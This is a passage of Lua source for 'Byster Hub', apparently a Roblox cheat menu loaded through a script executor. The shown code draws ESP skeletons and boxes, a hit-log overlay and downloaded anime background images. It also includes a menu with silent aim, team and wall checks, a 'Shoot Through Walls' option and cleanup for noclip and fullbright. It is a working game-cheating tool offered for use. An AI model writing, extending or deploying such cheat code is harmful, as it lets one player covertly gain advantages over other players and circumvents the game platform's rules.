        squareSet(Bx,Top.X-Wd/2,Top.Y<Bot.Y and Top.Y or Bot.Y,Wd,H,Col,Thick)
       else
        hideR(P.Box)
       end
      end
      if sSkel then
       if D2<=SD2 then
        local Sk=P.Skel
        if not Sk then
         Sk={}
         for k=1,14 do Sk[k]=newLine() end
         P.Skel=Sk
        end
        local J=getJoints(Rg,Now)
        local Pts=P.Pts
        local Names=Rg.R15 and R15Names or R6Names
        for k=1,#Names do
         local jp=J[k]
         if jp and jp.Parent then Pts[k]=Camera:WorldToViewportPoint(jp.Position) else Pts[k]=false end
        end
        local Bones=Rg.R15 and R15Bones or R6Bones
        for b=1,14 do
         local L=Sk[b]
         local Pair=Bones[b]
         if Pair then
          local A,B=Pts[Pair[1]],Pts[Pair[2]]
          if A and B and A.Z>0 and B.Z>0 then
           lineSet(L,A.X,A.Y,B.X,B.Y,Col,Thick)
          else
           hideR(L)
          end
         else
          hideR(L)
         end
        end
       else
        hideList(P.Skel)
       end
      end
     end
    end
   end
   if not Drawn then
    local P=Pool[pl]
    if P and P.Shown then
     hideP(P)
     P.Shown=false
    end
   end
  end
 end)
 connect(Players.PlayerRemoving,ESPX.Remove)
end


local function inst(Class,Props,Parent)
 local o=Instance.new(Class)
 for k,v in pairs(Props) do o[k]=v end
 o.Parent=Parent
 return o
end

local WatermarkGui=inst("ScreenGui",{Name="BysterWatermark",ResetOnSpawn=false,IgnoreGuiInset=true,DisplayOrder=99999},ParentContainer)
local Pill=inst("Frame",{Name="Pill",AnchorPoint=Vector2.new(0.5,0),Position=UDim2.new(0.5,0,0,14),Size=UDim2.new(0,0,0,30),AutomaticSize=Enum.AutomaticSize.X,BackgroundColor3=Color3.fromRGB(10,14,22),BackgroundTransparency=0.12,BorderSizePixel=0,Active=false},WatermarkGui)
inst("UICorner",{CornerRadius=UDim.new(1,0)},Pill)
local PillStroke=inst("UIStroke",{Thickness=1.5,Color=currentAccent,ApplyStrokeMode=Enum.ApplyStrokeMode.Border},Pill)
inst("UIPadding",{PaddingLeft=UDim.new(0,18),PaddingRight=UDim.new(0,18)},Pill)
inst("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,HorizontalAlignment=Enum.HorizontalAlignment.Center,VerticalAlignment=Enum.VerticalAlignment.Center,SortOrder=Enum.SortOrder.LayoutOrder,Padding=UDim.new(0,10)},Pill)
local TitleLabel=inst("TextLabel",{LayoutOrder=1,Size=UDim2.new(0,0,1,0),AutomaticSize=Enum.AutomaticSize.X,BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="Byster Hub",TextSize=13,TextColor3=currentAccent},Pill)
inst("Frame",{LayoutOrder=2,Size=UDim2.new(0,1,0,14),BackgroundColor3=Color3.fromRGB(60,78,105),BorderSizePixel=0},Pill)
local FPSLabel=inst("TextLabel",{LayoutOrder=3,Size=UDim2.new(0,64,1,0),BackgroundTransparency=1,Font=Enum.Font.GothamMedium,RichText=true,Text='FPS <font color="#ffffff">--</font>',TextSize=12,TextColor3=Color3.fromRGB(140,156,180),TextXAlignment=Enum.TextXAlignment.Center},Pill)
accentListeners[#accentListeners+1]=function(c)
 PillStroke.Color=c
 TitleLabel.TextColor3=c:Lerp(Color3.new(1,1,1),0.25)
end
do
 local Fr,El=0,0
 connect(RunService.RenderStepped,function(d)
  if not Alive then return end
  Fr=Fr+1
  El=El+d
  if El>=0.5 then
   local f=math.floor(Fr/El+0.5)
   Fr,El=0,0
   FPSLabel.Text='FPS <font color="#ffffff">'..f.."</font>"
  end
 end)
end

local zoomBlocked=false
local function menuOpen() return not Library.Unloaded and Library.Toggled==true end
local function setZoomBlock(b)
 if b==zoomBlocked then return end
 zoomBlocked=b
 if b then
  ContextActionService:BindActionAtPriority("BysterBlockZoom",function() return Enum.ContextActionResult.Sink end,false,Enum.ContextActionPriority.High.Value+100,Enum.UserInputType.MouseWheel)
 else
  ContextActionService:UnbindAction("BysterBlockZoom")
 end
end

local MenuFX={Choices={"None"},RightOffset=0}
do
 local HttpService=GS("HttpService")
 local BgBase="https://raw.githubusercontent.com/pro19e77ebh/1231/main/"
 local BgFolder="BysterHub/bg"
 local PosFile="BysterHub/waifu_positions.json"
 local BgList={
  {"Waifu 1","576883033498317033-removebg-preview.png",445/560},
  {"Waifu 2","rem_green_background-removebg-preview.png",375/666},
  {"Waifu 3","Nakano_Miku_-_Anime___Manga-removebg-preview.png",236/333},
  {"Blue Chibi","01_blue_chibi.png",736/1308},
  {"Pink Chibi","02_pink_chibi.png",736/1308},
  {"Rem Maid","03_rem_maid.png",735/752},
  {"Red Hair Girl","05_red_haired_girl.png",736/414},
  {"Anya","06_anya.png",1},
  {"Rem Sweater","%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2026-11-01_111659962.png",1024/1536}
 }
 local BgFiles={}
 for _,it in ipairs(BgList) do
  BgFiles[it[1]]={File=it[2],Aspect=it[3]}
  MenuFX.Choices[#MenuFX.Choices+1]=it[1]
 end
 local BgAssets={}
 local Slots={
  {Id="Left",Key="BgLeft",Text="Left Image",DX=-1,DY=0},
  {Id="Right",Key="BgRight",Text="Right Image",DX=1,DY=0},
  {Id="PeekTL",Key="BgPeekTL",Text="Peek Top Left",DX=0,DY=-1},
  {Id="PeekTR",Key="BgPeekTR",Text="Peek Top Right",DX=0,DY=-1},
  {Id="PeekBL",Key="BgPeekBL",Text="Peek Bottom Left",DX=0,DY=1},
  {Id="PeekBR",Key="BgPeekBR",Text="Peek Bottom Right",DX=0,DY=1},
  {Id="CornerL",Key="BgCornerL",Text="Screen Corner Left",DX=-1,DY=0},
  {Id="CornerR",Key="BgCornerR",Text="Screen Corner Right",DX=1,DY=0}
 }
 local SlotById={}
 for _,s in ipairs(Slots) do SlotById[s.Id]=s end
 MenuFX.Slots=Slots
 function MenuFX.Value(s) return S[s.Key] or "None" end
 local BlurAlpha,BgAlpha=0,0
 local MenuFrame,NextSearch=nil,0
 local Offsets={}
 pcall(function()
  if isfile and readfile and isfile(PosFile) then
   local D=HttpService:JSONDecode(readfile(PosFile))
   for id,p in pairs(D) do
    if SlotById[id] and type(p)=="table" and type(p[1])=="number" and type(p[2])=="number" then Offsets[id]=Vector2.new(p[1],p[2]) end
   end
  end
 end)
 local function savePositions()
  pcall(function()
   if not writefile then return end
   if makefolder and isfolder and not isfolder("BysterHub") then makefolder("BysterHub") end
   local D={}
   for id,o in pairs(Offsets) do D[id]={o.X,o.Y} end
   writefile(PosFile,HttpService:JSONEncode(D))
  end)
 end
 function MenuFX.ResetPositions()
  table.clear(Offsets)
  savePositions()
 end
 local MenuBlur=inst("BlurEffect",{Name="BysterMenuBlur",Size=0,Enabled=false},Lighting)
 local BgGui=Instance.new("ScreenGui")
 BgGui.Name="BysterBackground"
 BgGui.ResetOnSpawn=false
 BgGui.IgnoreGuiInset=true
 BgGui.Enabled=false
 local Order=10
 pcall(function()
  Order=(Library.ScreenGui and Library.ScreenGui.DisplayOrder or 999)-1
  if Library.ScreenGui then BgGui.IgnoreGuiInset=Library.ScreenGui.IgnoreGuiInset end
 end)
 BgGui.DisplayOrder=Order
 BgGui.Parent=ParentContainer
 local TopZ=1
 for _,s in ipairs(Slots) do
  s.Card=inst("ImageLabel",{Name=s.Id.."Model",BackgroundTransparency=1,BorderSizePixel=0,ScaleType=Enum.ScaleType.Fit,ImageTransparency=1,Visible=false,Active=S.BgDrag},BgGui)
  s.Aspect=0.8
  s.Anchor=Vector2.new(0,0)
  s.W,s.H=0,0
 end
 local function viewSize()
  local c=workspace.CurrentCamera
  return c and c.ViewportSize or Vector2.new(1280,720)
 end
 local Drag=nil
 local function isPress(i) return i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch end
 local function clampOffset(s,o,v)
  local X=math.clamp(s.Anchor.X+o.X,0,math.max(0,v.X-s.W))
  local Y=math.clamp(s.Anchor.Y+o.Y,0,math.max(0,v.Y-s.H))
  return Vector2.new(X-s.Anchor.X,Y-s.Anchor.Y)
 end
 for _,s in ipairs(Slots) do
  connect(s.Card.InputBegan,function(i)
   if S.BgDrag and isPress(i) then
    TopZ=TopZ+1
    s.Card.ZIndex=TopZ
    Drag={Slot=s,Start=Vector2.new(i.Position.X,i.Position.Y),Origin=Offsets[s.Id] or Vector2.new(0,0)}
   end
  end)
 end
 connect(UserInputService.InputChanged,function(i)
  if Drag and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
   local d=Vector2.new(i.Position.X,i.Position.Y)-Drag.Start
   Offsets[Drag.Slot.Id]=clampOffset(Drag.Slot,Drag.Origin+d,viewSize())
  end
 end)
 connect(UserInputService.InputEnded,function(i)
  if Drag and isPress(i) then Drag=nil savePositions() end
 end)
 local function loadAsset(Name)
  if BgAssets[Name] then return BgAssets[Name] end
  local Info=BgFiles[Name]
  if not Info then return nil,"Unknown image" end
  local GA=getcustomasset or getsynasset
  if not (GA and writefile and isfile) then return nil,"Executor has no custom asset support" end
  pcall(function()
   if makefolder and isfolder then
    if not isfolder("BysterHub") then makefolder("BysterHub") end
    if not isfolder(BgFolder) then makefolder(BgFolder) end
   end
  end)
  local Path=BgFolder.."/"..(Name:gsub("[^%w]","_"))..".png"
  if not isfile(Path) then
   local ok,Data=pcall(game.HttpGet,game,BgBase..Info.File)
   if not ok or type(Data)~="string" or #Data<1000 then return nil,"Image download failed: "..Name end
   if not pcall(writefile,Path,Data) then return nil,"Could not save image" end
  end
  local ok,A=pcall(GA,Path)
  if not ok or not A or A=="" then return nil,"Could not load image" end
  BgAssets[Name]=A
  return A
 end
 function MenuFX.Select(Id,Name)
  local s=SlotById[Id]
  if not s then return end
  local Card=s.Card
  S[s.Key]=Name
  if not Name or Name=="None" or not BgFiles[Name] then Card.Image="" return end
  s.Aspect=BgFiles[Name].Aspect
  task.spawn(function()
   local A,Err=loadAsset(Name)
   if S[s.Key]~=Name then return end
   if A then Card.Image=A else Library:Notify({Title="Background",Description=tostring(Err),Time=4}) end
  end)
 end
 local function findMenuFrame(View)
  if MenuFrame and MenuFrame.Parent then return MenuFrame end
  MenuFrame=nil
  if os.clock()<NextSearch then return nil end
  NextSearch=os.clock()+1
  local Root=Library.ScreenGui
  if not Root then return nil end
  local Best,BA=nil,0
  for _,o in ipairs(Root:GetDescendants()) do
   if o:IsA("GuiObject") then
    local z=o.AbsoluteSize
    if z.X>=500 and z.Y>=350 and z.X<View.X and z.Y<View.Y then
     local a=z.X*z.Y
     if a>BA then Best,BA=o,a end
    end
   end
  end
  MenuFrame=Best
  return Best
 end
 local function menuRect(View)
  local F=findMenuFrame(View)
  if F then return F.AbsolutePosition,F.AbsoluteSize end
  local z=Vector2.new(760,540)
  return (View-z)/2,z
 end
 MenuFX.GetRect=menuRect
 local function anchorFor(Id,Pos,Size,View,W_,H_)
  local Gap=6
  if Id=="Left" then return Pos.X-W_-Gap,Pos.Y+Size.Y-H_
  elseif Id=="Right" then return Pos.X+Size.X+Gap+MenuFX.RightOffset,Pos.Y+Size.Y-H_
  elseif Id=="PeekTL" then return Pos.X+12,Pos.Y-H_*0.6
  elseif Id=="PeekTR" then return Pos.X+Size.X-W_-12,Pos.Y-H_*0.6
  elseif Id=="PeekBL" then return Pos.X+12,Pos.Y+Size.Y-H_*0.4
  elseif Id=="PeekBR" then return Pos.X+Size.X-W_-12,Pos.Y+Size.Y-H_*0.4
  elseif Id=="CornerL" then return 4,View.Y-H_-4 end
  return View.X-W_-4,View.Y-H_-4
 end
 function MenuFX.Apply(Delta)
  local Open=menuOpen()
  local Speed=math.min(1,Delta*10)
  local BT=(Open and S.MenuBlur) and 1 or 0
  BlurAlpha=BlurAlpha+(BT-BlurAlpha)*Speed
  if math.abs(BT-BlurAlpha)<0.01 then BlurAlpha=BT end
  if BlurAlpha>0 then
   MenuBlur.Enabled=true
   MenuBlur.Size=S.MenuBlurSize*BlurAlpha
  elseif MenuBlur.Enabled then
   MenuBlur.Enabled=false
  end
  local Has=false
  for _,s in ipairs(Slots) do if s.Card.Image~="" then Has=true break end end
  local GT=(Open and S.BgEnabled and Has) and 1 or 0
  BgAlpha=BgAlpha+(GT-BgAlpha)*Speed
  if math.abs(GT-BgAlpha)<0.01 then BgAlpha=GT end
  if BgAlpha<=0 then
   if BgGui.Enabled then BgGui.Enabled=false end
   Drag=nil
   return
  end
  BgGui.Enabled=true
  local View=viewSize()
  local Pos,Size=menuRect(View)
  local Slide=(1-BgAlpha)*36
  local Time=os.clock()
  for idx,s in ipairs(Slots) do
   local L=s.Card
   local Shown=L.Image~=""
   L.Visible=Shown
   L.Active=S.BgDrag
   if Shown then
    local H=S.BgSize
    local Wd=H*s.Aspect
    if Wd>S.BgSize then Wd=S.BgSize H=Wd/s.Aspect end
    Wd,H=math.floor(Wd),math.floor(H)
    s.W,s.H=Wd,H
    local AX,AY=anchorFor(s.Id,Pos,Size,View,Wd,H)
    s.Anchor=Vector2.new(AX,AY)
    local O=Offsets[s.Id] or Vector2.new(0,0)
    local X=math.floor(math.clamp(AX+O.X,0,math.max(0,View.X-Wd)))
    local Y=math.floor(math.clamp(AY+O.Y,0,math.max(0,View.Y-H)))
    local Bob=math.sin(Time*1.6+idx*1.3)*3
    L.Size=UDim2.fromOffset(Wd,H)
    L.Position=UDim2.fromOffset(X+s.DX*Slide,Y+s.DY*Slide+Bob)
    L.ImageTransparency=1-BgAlpha*(S.BgOpacity/100)
   end
  end
 end
 function MenuFX.Destroy()
  pcall(function() MenuBlur:Destroy() end)
  pcall(function() BgGui:Destroy() end)
 end
end

local HIT={On=true,Strict=true,Range=250,Window=0.8,Max=3,Life=2.5,Position="Crosshair",Last=0,Cards={},PC={}}
do
 local TweenService=GS("TweenService")
 local HP=setmetatable({},{__mode="k"})
 local CardW,CardH=232,62
 local Counter=0
 local Gui=inst("ScreenGui",{Name="BysterHitLog",ResetOnSpawn=false,IgnoreGuiInset=true,DisplayOrder=99998},ParentContainer)
 local Holder=inst("Frame",{Name="Holder",BackgroundTransparency=1,Size=UDim2.fromOffset(CardW,0),AutomaticSize=Enum.AutomaticSize.Y},Gui)
 inst("UIListLayout",{Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder,HorizontalAlignment=Enum.HorizontalAlignment.Center},Holder)
 function HIT.SetPosition(Name)
  HIT.Position=Name
  if Name=="Bottom" then
   Holder.AnchorPoint=Vector2.new(0.5,0)
   Holder.Position=UDim2.new(0.5,0,0.74,0)
  elseif Name=="Top" then
   Holder.AnchorPoint=Vector2.new(0.5,0)
   Holder.Position=UDim2.new(0.5,0,0.1,0)
  else
   Holder.AnchorPoint=Vector2.new(0,0)
   Holder.Position=UDim2.new(0.5,48,0.5,-CardH/2)
  end
 end
 HIT.SetPosition(HIT.Position)
 local function fmt(v)
  if v>=10 then return tostring(math.floor(v+0.5)) end
  return string.format("%.1f",v)
 end
 local function hpColor(p)
  if p>0.5 then return Color3.fromRGB(255,200,60):Lerp(Color3.fromRGB(70,230,120),(p-0.5)*2) end
  return Color3.fromRGB(255,70,70):Lerp(Color3.fromRGB(255,200,60),p*2)
 end
 local function mkLabel(Parent,X,Y,Wd,Ht,Font,Size,Color,Align)
  return inst("TextLabel",{BackgroundTransparency=1,Position=UDim2.fromOffset(X,Y),Size=UDim2.fromOffset(Wd,Ht),Font=Font,TextSize=Size,TextColor3=Color,TextXAlignment=Align,Text=""},Parent)
 end
 local function buildCard()
  Counter=Counter+1
  local F=inst("CanvasGroup",{Name="HitCard",LayoutOrder=-Counter,Size=UDim2.fromOffset(CardW,CardH),BackgroundColor3=Color3.fromRGB(10,14,22),BackgroundTransparency=0.06,BorderSizePixel=0,GroupTransparency=1},Holder)
  inst("UICorner",{CornerRadius=UDim.new(0,12)},F)
  local Stroke=inst("UIStroke",{Thickness=1.5,Color=currentAccent,ApplyStrokeMode=Enum.ApplyStrokeMode.Border},F)
  local Scale=inst("UIScale",{Scale=0.9},F)
  local Name=mkLabel(F,12,6,CardW-100,20,Enum.Font.GothamBold,13,Color3.fromRGB(240,245,255),Enum.TextXAlignment.Left)
  Name.RichText=true
  Name.TextTruncate=Enum.TextTruncate.AtEnd
  local Dmg=mkLabel(F,CardW-92,4,80,24,Enum.Font.GothamBlack,17,Color3.fromRGB(255,90,90),Enum.TextXAlignment.Right)
  local Bar=inst("Frame",{Position=UDim2.fromOffset(12,32),Size=UDim2.fromOffset(CardW-24,8),BackgroundColor3=Color3.fromRGB(24,32,46),BorderSizePixel=0,ClipsDescendants=true},F)
  inst("UICorner",{CornerRadius=UDim.new(1,0)},Bar)
  local Fill=inst("Frame",{Size=UDim2.new(1,0,1,0),BackgroundColor3=Color3.fromRGB(70,230,120),BorderSizePixel=0,ZIndex=2},Bar)
  inst("UICorner",{CornerRadius=UDim.new(1,0)},Fill)
  local Lost=inst("Frame",{Size=UDim2.new(0,0,1,0),BackgroundColor3=Color3.fromRGB(255,110,110),BorderSizePixel=0,ZIndex=1},Bar)
  local Hp=mkLabel(F,12,43,130,14,Enum.Font.GothamMedium,11,Color3.fromRGB(190,200,215),Enum.TextXAlignment.Left)
  local Combo=mkLabel(F,CardW-122,43,110,14,Enum.Font.GothamMedium,11,Color3.fromRGB(255,215,90),Enum.TextXAlignment.Right)
  return {Frame=F,Stroke=Stroke,Scale=Scale,Name=Name,Dmg=Dmg,Fill=Fill,Lost=Lost,Hp=Hp,Combo=Combo,Hits=0,Total=0,Time=os.clock(),Dying=false}
 end
 local function fill(Card,Dmg,Health,Max,Prev)
  Max=math.max(Max,1)
  local Pc=math.clamp(Health/Max,0,1)
  local PP=math.clamp(Prev/Max,0,1)
  Card.Dmg.Text="-"..fmt(Dmg)
  if Health<=0 then
   Card.Hp.Text="ELIMINATED"
   Card.Hp.TextColor3=Color3.fromRGB(255,90,90)
  else
   Card.Hp.Text=fmt(Health).." / "..fmt(Max).." HP"
   Card.Hp.TextColor3=Color3.fromRGB(190,200,215)
  end
  Card.Fill.BackgroundColor3=hpColor(Pc)
  TweenService:Create(Card.Fill,TweenInfo.new(0.18,Enum.EasingStyle.Quad),{Size=UDim2.new(Pc,0,1,0)}):Play()
  Card.Lost.Position=UDim2.new(Pc,0,0,0)
  Card.Lost.Size=UDim2.new(math.max(PP-Pc,0),0,1,0)
  TweenService:Create(Card.Lost,TweenInfo.new(0.55,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0.25),{Size=UDim2.new(0,0,1,0)}):Play()
  Card.Combo.Text=Card.Hits>1 and ("x"..Card.Hits.."  •  Σ "..fmt(Card.Total)) or ""
  Card.Dmg.TextSize=22
  TweenService:Create(Card.Dmg,TweenInfo.new(0.25,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{TextSize=17}):Play()
 end
 local function kill(Key,Instant)
  local Card=HIT.Cards[Key]
  if not Card or Card.Dying then return end
  Card.Dying=true
  if Instant then
   Card.Frame:Destroy()
   HIT.Cards[Key]=nil
   return
  end
  TweenService:Create(Card.Frame,TweenInfo.new(0.25),{GroupTransparency=1}):Play()
  TweenService:Create(Card.Scale,TweenInfo.new(0.25),{Scale=0.92}):Play()
  task.delay(0.3,function()
   Card.Frame:Destroy()
   if HIT.Cards[Key]==Card then HIT.Cards[Key]=nil end
  end)
 end
 local function richName(pl)
  local t=escapeRich(pl.DisplayName)
  if pl.DisplayName~=pl.Name then t=t..' <font size="11" color="rgb(140,156,180)">@'..escapeRich(pl.Name).."</font>" end
  return t
 end
 local function showHit(Key,Name,Dmg,Health,Max,Prev)
  local Card=HIT.Cards[Key]
  if Card and Card.Dying then Card=nil end
  if not Card then
   local Count,Oldest,OT=0,nil,math.huge
   for K,Cd in pairs(HIT.Cards) do
    if not Cd.Dying then
     Count=Count+1
     if Cd.Time<OT then Oldest,OT=K,Cd.Time end
    end
   end
   if Count>=HIT.Max and Oldest~=nil then kill(Oldest,true) end
   Card=buildCard()
   HIT.Cards[Key]=Card
   TweenService:Create(Card.Frame,TweenInfo.new(0.18),{GroupTransparency=0}):Play()
   TweenService:Create(Card.Scale,TweenInfo.new(0.28,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{Scale=1}):Play()
  end
  Card.Hits=Card.Hits+1
  Card.Total=Card.Total+Dmg
  Card.Time=os.clock()
  Card.Name.Text=Name
  fill(Card,Dmg,Health,Max,Prev)
 end
 accentListeners[#accentListeners+1]=function(c)
  for _,Card in pairs(HIT.Cards) do Card.Stroke.Color=c end
 end
 function HIT.Test()
  local Dmg=math.random(12,38)
  local Health=math.random(25,90)
  showHit("__test",'Preview Player <font size="11" color="rgb(140,156,180)">@preview</font>',Dmg,Health,100,Health+Dmg)
 end
 local LastTarget,LastTargetAt=nil,0
 local ConeCos=math.cos(math.rad(9))
 local function coneTarget()
  local Camera=cam()
  local My=LocalPlayer.Character
  if not Camera or not My then return nil end
  local O=Camera.CFrame.Position
  local Look=Camera.CFrame.LookVector
  local Pr=RaycastParams.new()
  Pr.FilterType=Enum.RaycastFilterType.Exclude
  Pr.FilterDescendantsInstances={My}
  local Best,BC=nil,ConeCos
  for _,pl in ipairs(Players:GetPlayers()) do
   if pl~=LocalPlayer then
    local Ch=pl.Character
    local R=Ch and Ch:FindFirstChild("HumanoidRootPart")
    local H=Ch and Ch:FindFirstChildOfClass("Humanoid")
    if R and H and H.Health>0 then
     local Off=R.Position-O
     local D=Off.Magnitude
     if D>0.1 and D<=HIT.Range then
      local Cs=Look:Dot(Off/D)
      if Cs>BC then
       local Res=Workspace:Raycast(O,Off,Pr)
       if not (Res and not Res.Instance:IsDescendantOf(Ch)) then Best,BC=Ch,Cs end
      end
     end
    end
   end
  end
  return Best
 end
 local function credited(Ch,Hum)
  local Tag=Hum:FindFirstChild("creator")
  if Tag and Tag:IsA("ObjectValue") and Tag.Value~=nil then return Tag.Value==LocalPlayer end
  if os.clock()-HIT.Last>HIT.Window then return false end
  if HIT.Strict then return LastTarget==Ch and os.clock()-LastTargetAt<=HIT.Window end
  local My=LocalPlayer.Character
  local MR=My and My:FindFirstChild("HumanoidRootPart")
  local R=Ch and Ch:FindFirstChild("HumanoidRootPart")
  if not MR or not R then return false end
  return (MR.Position-R.Position).Magnitude<=HIT.Range
 end
 connect(UserInputService.InputBegan,function(i,Pr)
  if Pr then return end
  local T=i.UserInputType
  if T==Enum.UserInputType.MouseButton1 or T==Enum.UserInputType.MouseButton2 or T==Enum.UserInputType.Touch then
   HIT.Last=os.clock()
   local Tg=coneTarget()
   if Tg then LastTarget=Tg LastTargetAt=os.clock() end
  end
 end)
 local function hookLocal(Ch)
  task.spawn(function()
   local H=Ch:WaitForChild("Humanoid",10)
   local An=H and (H:FindFirstChildOfClass("Animator") or H:WaitForChild("Animator",10))
   if not An then return end
   An.AnimationPlayed:Connect(function(Tr)
    if not Tr.Looped and Tr.Priority~=Enum.AnimationPriority.Core and Tr.Priority.Value>=Enum.AnimationPriority.Action.Value then HIT.Last=os.clock() end
   end)
  end)
 end
 if LocalPlayer.Character then hookLocal(LocalPlayer.Character) end
 connect(LocalPlayer.CharacterAdded,hookLocal)
 local function dropConns(pl)
  local Cs=HIT.PC[pl]
  if Cs then for _,c in ipairs(Cs) do pcall(c.Disconnect,c) end end
  HIT.PC[pl]=nil
 end
 local function track(pl)
  if pl==LocalPlayer then return end
  local function onChar(Ch)
   dropConns(pl)
   HIT.PC[pl]={}
   task.spawn(function()
    local H=Ch:WaitForChild("Humanoid",10)
    if not H or not Alive then return end
    HP[H]=H.Health
    local Cn=H.HealthChanged:Connect(function(New)
     local Prev=HP[H] or New
     HP[H]=New
     local D=Prev-New
     if not HIT.On or D<0.5 then return end
     if not credited(Ch,H) then return end
     showHit(pl,richName(pl),D,math.max(New,0),H.MaxHealth,Prev)
    end)
    local Cs=HIT.PC[pl]
    if Cs then Cs[#Cs+1]=Cn else Cn:Disconnect() end
   end)
  end
  if pl.Character then onChar(pl.Character) end
  connect(pl.CharacterAdded,onChar)
 end
 for _,pl in ipairs(Players:GetPlayers()) do track(pl) end
 connect(Players.PlayerAdded,track)
 connect(Players.PlayerRemoving,dropConns)
 connect(RunService.Heartbeat,function()
  if not Alive then return end
  local Now=os.clock()
  for K,Cd in pairs(HIT.Cards) do
   if not Cd.Dying and Now-Cd.Time>=HIT.Life then kill(K) end
  end
 end)
 function HIT.Destroy()
  for pl in pairs(HIT.PC) do dropConns(pl) end
  pcall(function() Gui:Destroy() end)
 end
end

local rainbowTimer,espTimer,worldTimer,cacheTimer=0,0,0,0
connect(RunService.RenderStepped,function(Delta)
 if not Alive then return end
 rainbowTimer=rainbowTimer+Delta
 if S.Rainbow and rainbowTimer>=0.06 then
  rainbowTimer=0
  setAccent(Color3.fromHSV((tick()*S.RainbowSpeed*0.01)%1,0.62,1))
 end
 espTimer=espTimer+Delta
 if espTimer>=0.2 then
  espTimer=0
  syncChams()
 end
 cacheTimer=cacheTimer+Delta
 if cacheTimer>=1 then
  cacheTimer=0
  table.clear(TeamCol)
  rebuildTeamSel()
 end
 setZoomBlock(menuOpen())
 MenuFX.Apply(Delta)
 applyLighting(Delta)
 applyCamera()
 worldTimer=worldTimer+Delta
 if worldTimer>=0.1 then worldTimer=0 applyInstances() end
 local Camera=cam()
 local VP=Camera.ViewportSize
 if S.ShowFOV then
  fovCircle.Position=S.FOVCenter and VP/2 or UserInputService:GetMouseLocation()
  fovCircle.Radius=S.FOVRadius
  fovCircle.Color=S.FOVColor
  fovCircle.Visible=true
 else
  fovCircle.Visible=false
 end
 silentTarget=S.SilentAim and findTarget() or nil
 local Shown=false
 if S.ShowTarget and silentTarget and silentTarget.Parent then
  local Pt,Vis=Camera:WorldToViewportPoint(silentTarget.Position)
  if Vis then
   Shown=true
   local A=tick()*S.RotationSpeed
   local Cs,Sn=math.cos(A),math.sin(A)
   local MS,ML=S.MarkerSize,S.MarkerLength
   local function rot(X,Y) return Vector2.new(Pt.X+X*Cs-Y*Sn,Pt.Y+X*Sn+Y*Cs) end
   local i=1
   for _,sx in ipairs({-1,1}) do
    for _,sy in ipairs({-1,1}) do
     local Cr=rot(sx*MS,sy*MS)
     local a=rot(sx*MS-sx*ML,sy*MS)
     local b=rot(sx*MS,sy*MS-sy*ML)
     targetLines[i].From=Cr targetLines[i].To=a targetLines[i].Color=S.TargetColor targetLines[i].Visible=true
     targetLines[i+1].From=Cr targetLines[i+1].To=b targetLines[i+1].Color=S.TargetColor targetLines[i+1].Visible=true
     i=i+2
    end
   end
  end
 end
 if not Shown then for i=1,8 do targetLines[i].Visible=false end end
end)

local function cleanup()
 if not Alive then return end
 Alive=false
 BuloHubUnloaded=true
 if Cos.Destroy then pcall(Cos.Destroy) end
 if WB_Unhook then pcall(WB_Unhook) end
 S.SilentAim=false
 S.Fullbright=false
 S.Noclip=false
 setZoomBlock(false)
 MenuFX.Destroy()
 HIT.Destroy()
 restoreWorld()
 restoreNoclip()
 clearChams()
 pcall(function() ChamsFolder:Destroy() end)
 ESPX.Clear()
 WS.Restore()
 FPS.Set(false)
 for _,c in ipairs(Connections) do pcall(c.Disconnect,c) end
 table.clear(Connections)
 pcall(fovCircle.Remove,fovCircle)
 for _,l in ipairs(targetLines) do pcall(l.Remove,l) end
 if WatermarkGui then WatermarkGui:Destroy() end
 if Environment.BysterHub and Environment.BysterHub.Cleanup==cleanup then Environment.BysterHub=nil end
end
Environment.BysterHub={Cleanup=cleanup,Unload=function()
 cleanup()
 if not Library.Unloaded then pcall(Library.Unload,Library) end
end}
Library:OnUnload(cleanup)

Library.CornerRadius=10
local Window=Library:CreateWindow({Title="Byster Hub",Footer="Byster HUB by oalala",Icon="skull",NotifySide="Right",ShowCustomCursor=not UserInputService.TouchEnabled,Size=UDim2.fromOffset(760,540),ToggleKeybind=Enum.KeyCode.RightShift,ShowMobileButtons=true,MobileButtonsSide="Left",GlobalSearch=true,EnableCompacting=true})
local Tabs={
 Combat=Window:AddTab("Combat","swords",""),
 Visuals=Window:AddTab("Visuals","eye",""),
 Cosmetics=Window:AddTab("Cosmetics","image",""),
 Movement=Window:AddTab("Movement","person-standing",""),
 World=Window:AddTab("World","sun",""),
 ["UI Settings"]=Window:AddTab("UI Settings","settings","")
}

local function tg(G,Id,Text,Tbl,Key,Tip,Cb)
 return G:AddToggle(Id,{Text=Text,Tooltip=Tip,Default=Tbl[Key],Callback=function(v) Tbl[Key]=v if Cb then Cb(v) end end})
end
local function sl(G,Id,Text,Tbl,Key,Min,Max,Rnd,Suf,Cb)
 G:AddSlider(Id,{Text=Text,Default=Tbl[Key],Min=Min,Max=Max,Rounding=Rnd or 0,Suffix=Suf or "",Callback=function(v) Tbl[Key]=v if Cb then Cb(v) end end})
end
local function col(Obj,Id,Title,Tbl,Key,Cb)
 Obj:AddColorPicker(Id,{Default=Tbl[Key],Title=Title,Callback=function(v) Tbl[Key]=v if Cb then Cb(v) end end})
end
local function kp(Tg,Id,Def,Text)
 Tg:AddKeyPicker(Id,{Default=Def,SyncToggleState=true,Mode="Toggle",Text=Text})
end

local AimGroup=Tabs.Combat:AddLeftGroupbox("Silent Aim","skull")
kp(tg(AimGroup,"SilentAim","Silent Aim",S,"SilentAim"),"SilentAimKeybind","Z","Silent Aim")
tg(AimGroup,"SmartTargeting","Smart Targeting",S,"SmartTargeting")
tg(AimGroup,"TeamCheck","Team Check",S,"TeamCheck")
tg(AimGroup,"WallCheck","Wall Check",S,"WallCheck")
tg(AimGroup,"SilentWallbang","Shoot Through Walls",S,"SilentWallbang","Redirect shots to the silent aim target through walls while holding Fire")
AimGroup:AddDropdown("TargetPart",{Values={"Head","Torso","HumanoidRootPart"},Default=S.TargetPart,Multi=false,Text="Target Part",AllowNull=false,Callback=function(v) S.TargetPart=v or "Head" end})

do
